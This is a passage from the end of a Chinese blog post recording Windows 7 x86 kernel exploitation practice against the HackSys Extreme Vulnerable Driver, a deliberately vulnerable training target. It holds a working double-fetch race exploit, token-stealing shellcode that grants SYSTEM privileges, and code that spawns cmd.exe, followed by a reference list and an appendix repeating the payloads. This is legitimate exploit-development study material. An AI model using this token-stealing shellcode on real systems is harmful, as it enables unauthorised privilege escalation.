</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="kr">__asm</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="n">pushad</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="p">;</span> <span class="err">获取当前进程</span><span class="n">EPROCESS</span>
</span></span><span class="line"><span class="cl">		<span class="n">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>
</span></span><span class="line"><span class="cl">		<span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="nl">fs</span><span class="p">:</span> <span class="p">[</span><span class="n">eax</span> <span class="o">+</span> <span class="n">KTHREAD_OFFSET</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">		<span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">eax</span> <span class="o">+</span> <span class="n">EPROCESS_OFFSET</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">		<span class="n">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">eax</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="p">;</span> <span class="err">搜索</span><span class="n">system进程EPROCESS</span>
</span></span><span class="line"><span class="cl">		<span class="n">mov</span> <span class="n">edx</span><span class="p">,</span> <span class="n">SYSTEM_PID</span>
</span></span><span class="line"><span class="cl">		<span class="nl">SearchSystemPID</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">		<span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">eax</span> <span class="o">+</span> <span class="n">FLINK_OFFSET</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">			<span class="n">sub</span> <span class="n">eax</span><span class="p">,</span> <span class="n">FLINK_OFFSET</span>
</span></span><span class="line"><span class="cl">			<span class="n">cmp</span><span class="p">[</span><span class="n">eax</span> <span class="o">+</span> <span class="n">PID_OFFSET</span><span class="p">],</span> <span class="n">edx</span>
</span></span><span class="line"><span class="cl">			<span class="n">jne</span> <span class="n">SearchSystemPID</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">			<span class="p">;</span> <span class="n">token窃取</span>
</span></span><span class="line"><span class="cl">			<span class="n">mov</span> <span class="n">edx</span><span class="p">,</span> <span class="p">[</span><span class="n">eax</span> <span class="o">+</span> <span class="n">TOKEN_OFFSET</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">			<span class="n">mov</span><span class="p">[</span><span class="n">ecx</span> <span class="o">+</span> <span class="n">TOKEN_OFFSET</span><span class="p">],</span> <span class="n">edx</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">			<span class="p">;</span> <span class="err">环境还原</span> <span class="o">+</span> <span class="err">返回</span>
</span></span><span class="line"><span class="cl">			<span class="n">popad</span>
</span></span><span class="line"><span class="cl">			<span class="n">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>
</span></span><span class="line"><span class="cl">			<span class="n">add</span> <span class="n">esp</span><span class="p">,</span> <span class="mi">12</span>
</span></span><span class="line"><span class="cl">			<span class="n">pop</span> <span class="n">ebp</span>
</span></span><span class="line"><span class="cl">			<span class="n">ret</span> <span class="mi">8</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">DWORD</span> <span class="n">WINAPI</span> <span class="nf">FlippingThread</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k">while</span> <span class="p">(</span><span class="n">TRUE</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="n">UserBuffer</span><span class="o">-&gt;</span><span class="n">Size</span> <span class="o">=</span> <span class="mh">0x824</span> <span class="o">+</span> <span class="mi">4</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">DWORD</span> <span class="n">WINAPI</span> <span class="nf">RacingThread</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k">while</span> <span class="p">(</span><span class="n">TRUE</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="n">ULONG</span> <span class="n">WriteRet</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="n">UserBuffer</span><span class="o">-&gt;</span><span class="n">Size</span> <span class="o">=</span> <span class="mh">0x200</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="nf">DeviceIoControl</span><span class="p">(</span><span class="n">hDevice</span><span class="p">,</span> <span class="mh">0x222037</span><span class="p">,</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)</span><span class="n">UserBuffer</span><span class="p">,</span> <span class="n">UserBufferSize</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">WriteRet</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="n">PVOID</span> <span class="n">EopPayload</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">TokenStealingPayloadWin7</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="n">hDevice</span> <span class="o">=</span> <span class="o">::</span><span class="nf">CreateFileW</span><span class="p">(</span><span class="sa">L</span><span class="s">&#34;</span><span class="se">\\\\</span><span class="s">.</span><span class="se">\\</span><span class="s">HacksysExtremeVulnerableDriver&#34;</span><span class="p">,</span> <span class="n">GENERIC_ALL</span><span class="p">,</span> <span class="n">FILE_SHARE_WRITE</span><span class="p">,</span> <span class="n">nullptr</span><span class="p">,</span> <span class="n">OPEN_EXISTING</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">nullptr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="n">UserBuffer</span> <span class="o">=</span> <span class="p">(</span><span class="n">PUserObject</span><span class="p">)</span><span class="nf">HeapAlloc</span><span class="p">(</span><span class="nf">GetProcessHeap</span><span class="p">(),</span> <span class="n">HEAP_ZERO_MEMORY</span><span class="p">,</span> <span class="n">UserBufferSize</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="n">UserBuffer</span><span class="o">-&gt;</span><span class="n">Buffer</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONG_PTR</span><span class="p">)</span><span class="nf">HeapAlloc</span><span class="p">(</span><span class="nf">GetProcessHeap</span><span class="p">(),</span> <span class="n">HEAP_ZERO_MEMORY</span><span class="p">,</span> <span class="mh">0x900</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="o">*</span><span class="p">(</span><span class="n">PULONG</span><span class="p">)(</span><span class="n">UserBuffer</span><span class="o">-&gt;</span><span class="n">Buffer</span> <span class="o">+</span> <span class="mh">0x824</span><span class="p">)</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONG</span><span class="p">)</span><span class="n">EopPayload</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="n">HANDLE</span> <span class="n">hThreadRacing</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
</span></span><span class="line"><span class="cl">	<span class="n">HANDLE</span> <span class="n">hThreadFlipping</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
</span></span><span class="line"><span class="cl">	<span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">10</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="n">hThreadRacing</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="nf">CreateThread</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span><span class="n">RacingThread</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">CREATE_SUSPENDED</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="n">hThreadFlipping</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="nf">CreateThread</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span><span class="n">FlippingThread</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">CREATE_SUSPENDED</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="c1">// 设置优先级可以提升线程抢占到CPU的频率，更有机会执行到shellcode
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="nf">SetThreadPriority</span><span class="p">(</span><span class="n">hThreadRacing</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">THREAD_PRIORITY_HIGHEST</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="nf">SetThreadPriority</span><span class="p">(</span><span class="n">hThreadFlipping</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">THREAD_PRIORITY_HIGHEST</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="nf">ResumeThread</span><span class="p">(</span><span class="n">hThreadRacing</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">		<span class="nf">ResumeThread</span><span class="p">(</span><span class="n">hThreadFlipping</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="nf">WaitForMultipleObjects</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span> <span class="n">hThreadRacing</span><span class="p">,</span> <span class="n">TRUE</span><span class="p">,</span> <span class="mi">60000</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">10</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="nf">TerminateThread</span><span class="p">(</span><span class="n">hThreadRacing</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">			<span class="nf">CloseHandle</span><span class="p">(</span><span class="n">hThreadRacing</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">			<span class="nf">TerminateThread</span><span class="p">(</span><span class="n">hThreadFlipping</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">			<span class="nf">CloseHandle</span><span class="p">(</span><span class="n">hThreadFlipping</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="nf">HeapFree</span><span class="p">(</span><span class="nf">GetProcessHeap</span><span class="p">(),</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)</span><span class="n">UserBuffer</span><span class="o">-&gt;</span><span class="n">Buffer</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="nf">HeapFree</span><span class="p">(</span><span class="nf">GetProcessHeap</span><span class="p">(),</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)</span><span class="n">UserBuffer</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="n">UserBuffer</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="nf">system</span><span class="p">(</span><span class="s">&#34;cmd.exe&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><h2 id="tips" class="heading-element">
  <a href="#tips" class="heading-mark"></a>TIPS</h2><h2 id="参考" class="heading-element">
  <a href="#%e5%8f%82%e8%80%83" class="heading-mark"></a>参考</h2><ul>
<li><a href="https://50u1w4y.github.io/site/HEVD/homePage/"target="_blank" rel="external nofollow noopener noreferrer">https://50u1w4y.github.io/site/HEVD/homePage/</a></li>
<li><a href="https://blog.kn0sky.com/"target="_blank" rel="external nofollow noopener noreferrer">https://blog.kn0sky.com/</a></li>
<li><a href="https://bbs.kanxue.com/homepage-825245.htm"target="_blank" rel="external nofollow noopener noreferrer">https://bbs.kanxue.com/homepage-825245.htm</a></li>
<li><a href="https://tttang.com/user/misift_Zero"target="_blank" rel="external nofollow noopener noreferrer">https://tttang.com/user/misift_Zero</a></li>
<li><a href="https://bbs.kanxue.com/homepage-835440.htm"target="_blank" rel="external nofollow noopener noreferrer">https://bbs.kanxue.com/homepage-835440.htm</a></li>
<li><a href="https://bbs.kanxue.com/homepage-thread-837014-1.htm"target="_blank" rel="external nofollow noopener noreferrer">https://bbs.kanxue.com/homepage-thread-837014-1.htm</a></li>
<li><a href="https://bbs.kanxue.com/homepage-921642.htm"target="_blank" rel="external nofollow noopener noreferrer">https://bbs.kanxue.com/homepage-921642.htm</a></li>
<li><a href="https://xiaodaozhi.com/archives.html"target="_blank" rel="external nofollow noopener noreferrer">https://xiaodaozhi.com/archives.html</a></li>
<li><a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver"target="_blank" rel="external nofollow noopener noreferrer">https://github.com/hacksysteam/HackSysExtremeVulnerableDriver</a></li>
<li><a href="https://klue.github.io/blog/2017/09/hevd_stack_gs/?msclkid=9bb65ef4cf4a11ec8dd20f19f6cc758c"target="_blank" rel="external nofollow noopener noreferrer">https://klue.github.io/blog/2017/09/hevd_stack_gs/?msclkid=9bb65ef4cf4a11ec8dd20f19f6cc758c</a></li>
<li><a href="https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/ntos/hal/hal_dispatch.htm"target="_blank" rel="external nofollow noopener noreferrer">https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/ntos/hal/hal_dispatch.htm</a></li>
<li><a href="https://fuzzysecurity.com/tutorials/expDev/15.html"target="_blank" rel="external nofollow noopener noreferrer">https://fuzzysecurity.com/tutorials/expDev/15.html</a></li>
<li><a href="https://bbs.kanxue.com/thread-223719.htm"target="_blank" rel="external nofollow noopener noreferrer">https://bbs.kanxue.com/thread-223719.htm</a></li>
<li><a href="https://www.freesion.com/article/2629792577/"target="_blank" rel="external nofollow noopener noreferrer">https://www.freesion.com/article/2629792577/</a></li>
<li><a href="http://media.blackhat.com/bh-dc-11/Mandt/BlackHat_DC_2011_Mandt_kernelpool-Slides.pdf"target="_blank" rel="external nofollow noopener noreferrer">http://media.blackhat.com/bh-dc-11/Mandt/BlackHat_DC_2011_Mandt_kernelpool-Slides.pdf</a></li>
<li><a href="https://rootkits.xyz/blog/2017/11/kernel-pool-overflow/"target="_blank" rel="external nofollow noopener noreferrer">https://rootkits.xyz/blog/2017/11/kernel-pool-overflow/</a></li>
<li><a href="https://fuzzysecurity.com/tutorials/expDev/19.html"target="_blank" rel="external nofollow noopener noreferrer">https://fuzzysecurity.com/tutorials/expDev/19.html</a></li>
<li><a href="https://vxfade.wordpress.com/2010/06/06/wrk-%E5%AF%B9%E5%90%8E%E5%A4%87%E5%88%97%E8%A1%A8%EF%BC%88lookaside-list%EF%BC%89%E7%9A%84%E6%9C%BA%E5%88%B6%E5%88%86%E6%9E%90/"target="_blank" rel="external nofollow noopener noreferrer">https://vxfade.wordpress.com/2010/06/06/wrk-%E5%AF%B9%E5%90%8E%E5%A4%87%E5%88%97%E8%A1%A8%EF%BC%88lookaside-list%EF%BC%89%E7%9A%84%E6%9C%BA%E5%88%B6%E5%88%86%E6%9E%90/</a></li>
<li><a href="https://blog.csdn.net/yangdazhi/article/details/13745257"target="_blank" rel="external nofollow noopener noreferrer">https://blog.csdn.net/yangdazhi/article/details/13745257</a></li>
<li><a href="https://www.anquanke.com/post/id/86188"target="_blank" rel="external nofollow noopener noreferrer">https://www.anquanke.com/post/id/86188</a></li>
<li><a href="https://dl.packetstormsecurity.net/papers/general/kernelpool-exploitation.pdf"target="_blank" rel="external nofollow noopener noreferrer">https://dl.packetstormsecurity.net/papers/general/kernelpool-exploitation.pdf</a></li>
</ul>
<div class="highlight" id="id-111"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">VOID</span> <span class="nf">TokenStealingPayloadWin7</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// Importance of Kernel Recovery
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kr">__asm</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="n">pushad</span>
</span></span><span class="line"><span class="cl">		<span class="n">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>
</span></span><span class="line"><span class="cl">		<span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="nl">fs</span><span class="p">:</span> <span class="p">[</span><span class="n">eax</span> <span class="o">+</span> <span class="mi">124</span><span class="n">h</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">		<span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">eax</span> <span class="o">+</span> <span class="mo">050</span><span class="n">h</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">		<span class="n">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">eax</span>
</span></span><span class="line"><span class="cl">		<span class="n">mov</span> <span class="n">edx</span><span class="p">,</span> <span class="mi">4</span>
</span></span><span class="line"><span class="cl">		<span class="nl">SearchSystemPID</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">		<span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">eax</span> <span class="o">+</span> <span class="mi">0</span><span class="n">b8h</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">			<span class="n">sub</span> <span class="n">eax</span><span class="p">,</span> <span class="mi">0</span><span class="n">b8h</span>
</span></span><span class="line"><span class="cl">			<span class="n">cmp</span><span class="p">[</span><span class="n">eax</span> <span class="o">+</span> <span class="mi">0</span><span class="n">b4h</span><span class="p">],</span> <span class="n">edx</span>
</span></span><span class="line"><span class="cl">			<span class="n">jne</span> <span class="n">SearchSystemPID</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">			<span class="n">mov</span> <span class="n">edx</span><span class="p">,</span> <span class="p">[</span><span class="n">eax</span> <span class="o">+</span> <span class="mf">0f</span><span class="mi">8</span><span class="n">h</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">			<span class="n">mov</span><span class="p">[</span><span class="n">ecx</span> <span class="o">+</span> <span class="mf">0f</span><span class="mi">8</span><span class="n">h</span><span class="p">],</span> <span class="n">edx</span>
</span></span><span class="line"><span class="cl">			<span class="n">popad</span>
</span></span><span class="line"><span class="cl">			<span class="n">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>
</span></span><span class="line"><span class="cl">			<span class="n">add</span> <span class="n">esp</span><span class="p">,</span> <span class="mi">12</span>
</span></span><span class="line"><span class="cl">			<span class="n">pop</span> <span class="n">ebp</span>
</span></span><span class="line"><span class="cl">			<span class="n">ret</span> <span class="mi">8</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="n">VOID</span> <span class="nf">CreateCmd</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">STARTUPINFO</span> <span class="n">si</span> <span class="o">=</span> <span class="p">{</span><span class="k">sizeof</span><span class="p">(</span><span class="n">si</span><span class="p">)};</span>
</span></span><span class="line"><span class="cl">    <span class="n">PROCESS_INFORMATION</span> <span class="n">pi</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="n">si</span><span class="p">.</span><span class="n">dwFlags</span> <span class="o">=</span> <span class="n">STARTF_USESHOWWINDOW</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">si</span><span class="p">.</span><span class="n">wShowWindow</span> <span class="o">=</span> <span class="n">SW_SHOW</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">WCHAR</span> <span class="n">wzFilePath</span><span class="p">[</span><span class="n">MAX_PATH</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="sa">L</span><span class="s">&#34;cmd.exe&#34;</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="n">BOOL</span> <span class="n">bReturn</span> <span class="o">=</span> <span class="nf">CreateProcessW</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">wzFilePath</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="n">CREATE_NEW_CONSOLE</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="p">(</span><span class="n">LPSTARTUPINFOW</span><span class="p">)</span><span class="o">&amp;</span><span class="n">si</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pi</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">bReturn</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nf">CloseHandle</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hThread</span><span class="p">),</span> <span class="nf">CloseHandle</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="n">VOID</span> <span class="nf">ShellCode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">_asm</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// int 3
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="n">pop</span> <span class="n">edi</span>
</span></span><span class="line"><span class="cl">		<span class="n">pop</span> <span class="n">esi</span>
</span></span><span class="line"><span class="cl">		<span class="n">pop</span> <span class="n">ebx</span>
</span></span><span class="line"><span class="cl">		<span class="n">pushad</span>
</span></span><span class="line"><span class="cl">		<span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="nl">fs</span><span class="p">:</span> <span class="p">[</span><span class="mi">124</span><span class="n">h</span><span class="p">]</span> <span class="c1">// Find the _KTHREAD structure for the current thread
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">eax</span> <span class="o">+</span> <span class="mh">0x50</span><span class="p">]</span> <span class="c1">// Find the _EPROCESS structure
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="n">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">eax</span>
</span></span><span class="line"><span class="cl">		<span class="n">mov</span> <span class="n">edx</span><span class="p">,</span> <span class="mi">4</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="nl">find_sys_pid</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">					 <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">eax</span> <span class="o">+</span> <span class="mh">0xb8</span><span class="p">]</span> 
</span></span><span class="line"><span class="cl">					 <span class="n">sub</span> <span class="n">eax</span><span class="p">,</span> <span class="mh">0xb8</span>
</span></span><span class="line"><span class="cl">					 <span class="n">cmp</span><span class="p">[</span><span class="n">eax</span> <span class="o">+</span> <span class="mh">0xb4</span><span class="p">],</span> <span class="n">edx</span> 
</span></span><span class="line"><span class="cl">					 <span class="n">jnz</span> <span class="n">find_sys_pid</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">					 <span class="n">mov</span> <span class="n">edx</span><span class="p">,</span> <span class="p">[</span><span class="n">eax</span> <span class="o">+</span> <span class="mh">0xf8</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">					 <span class="n">mov</span><span class="p">[</span><span class="n">ecx</span> <span class="o">+</span> <span class="mh">0xf8</span><span class="p">],</span> <span class="n">edx</span>
</span></span><span class="line"><span class="cl">					 <span class="n">popad</span>
</span></span><span class="line"><span class="cl">					 <span class="n">ret</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div><div class="post-footer" id="post-footer">
  <div class="post-info">
    <div class="post-info-line">
      <div class="post-info-mod">
        <span title="更新于 2023-08-12 00:00:00">更新于 2023-08-12&nbsp;</span>
      </div><div class="post-info-license">
            <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a></span>
          </div></div><div class="post-info-line">
        <div class="post-info-md"></div>
        <div class="post-info-share">
          <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="http://localhost:1313/posts/2023-8-hevd/" data-title="HEVD-Windows7x86 SP1 记录" data-hashtags="WINDOWS"><i class="fa-brands fa-twitter fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="http://localhost:1313/posts/2023-8-hevd/" data-hashtag="WINDOWS"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="http://localhost:1313/posts/2023-8-hevd/" data-title="HEVD-Windows7x86 SP1 记录"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
  </span>
        </div>
      </div></div>

  <div class="post-info-more">
    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/windows/" class="post-tag" title="标签 - Windows">Windows</a></section>
    <section>
      <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
    </section>
  </div>

  <div class="post-nav"><a href="/posts/2023-7-linuxkernelpwn/" class="post-nav-item" rel="prev" title="Linux Kernel Pwn"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>Linux Kernel Pwn</a>
      <a href="/posts/2023-8-kernelpoolexploitationonwin7/" class="post-nav-item" rel="next" title="【译】Kernel Pool Exploitation on Windows 7">【译】Kernel Pool Exploitation on Windows 7<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article>

  <aside class="toc" id="toc-auto" aria-label="目录"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
      <div class="toc-content" id="toc-content-auto"></div></aside></main><footer class="footer">
    <div class="footer-container"><div class="footer-line powered">由 <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.124.1"><img class="hugo-icon" src="/images/hugo.min.svg" alt="Hugo logo" /> Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.2"><img class="fixit-icon" src="/images/fixit.min.svg" alt="FixIt logo" /> FixIt</a>
        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
            <span itemprop="copyrightYear">2024</span><span class="author" itemprop="copyrightHolder">
              <a href="/"></a></span></div></div>
  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
        </div></div><div id="mask"></div><noscript>
    <div class="noscript-warning">FixIt 主题在启用 JavaScript 的情况下效果最佳。</div>
  </noscript>
